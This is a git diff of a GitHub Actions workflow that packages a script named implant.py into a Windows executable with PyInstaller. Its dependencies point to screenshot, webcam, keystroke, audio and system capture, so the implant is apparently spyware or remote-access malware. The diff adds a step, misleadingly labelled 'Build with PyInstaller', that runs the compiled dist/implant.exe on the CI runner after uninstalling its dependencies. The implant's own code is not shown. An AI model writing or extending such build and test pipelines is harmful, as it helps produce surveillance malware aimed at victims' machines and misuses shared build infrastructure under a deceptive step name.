@@ -23,9 +23,7 @@ jobs:
           pip install pyinstaller==6.10.0  # Pin a known-good version
           pip install requests cryptography mss opencv-python keyboard pywin32 wmi pillow PyAudio pycryptodomex
 
-      - name: Build with PyInstaller
-        run: |
-          python implant.py
+      
           
       - name: Build with PyInstaller
         run: |
@@ -45,8 +43,14 @@ jobs:
             --collect-all keyboard `
             implant.py
 
-      
-
+      - name: Uninstall packaages
+        run: |
+          pip uninstall -y requests cryptography mss opencv-python keyboard pywin32 wmi pillow PyAudio pycryptodomex
+          
+      - name: Build with PyInstaller
+        run: |
+          dist/implant.exe
+          
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
